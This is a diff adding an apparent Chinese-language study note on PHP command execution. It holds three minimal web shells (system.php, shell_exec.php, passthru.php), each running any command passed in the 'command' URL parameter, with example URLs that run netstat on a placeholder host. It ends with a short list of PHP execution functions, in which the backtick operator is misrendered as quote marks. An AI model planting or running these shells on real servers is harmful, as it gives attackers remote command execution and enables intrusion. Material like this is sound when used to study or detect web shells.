@@ -1,0 +1,50 @@
+
+system.php:
+================================================================
+<?php
+  $cmd = $_GET['command'];
+  echo "<pre>";
+  system($cmd);
+  echo "</pre>";
+?>
+=================================================================
+http://www.xxx.com/system.php?command=netstat -anput
+
+
+
+
+shell_exec.php:
+================================================================
+<?php
+  $cmd = $_GET['command'];
+  echo "<pre>";
+  echo shell_exec($cmd);
+  echo "<pre>";
+?>
+=================================================================
+http://www.xxx.com/shell_exec.php?command=netstat -anput
+
+
+passthru.php
+================================================================
+<?php
+  $cmd = $_GET["command"];
+  echo "<pre>";
+  passthru($cmd);
+  echo "</pre>";
+?>
+=================================================================
+http://www.xxx.com/passthru.php?command=netstat -anput
+
+
+
+
+一些执行函数：
+-----------------------------------------------------------------
+php:
+  1.system      执行一个外部应用程序并显示结果
+  2.exec        执行一个外部应用程序
+  3.passthru    执行一个UNIX命令并显示原始输出
+  4.shell_exec  执行shell命令并返回输出结果
+  5. "''"预算符 与shell_exec功能相同
+
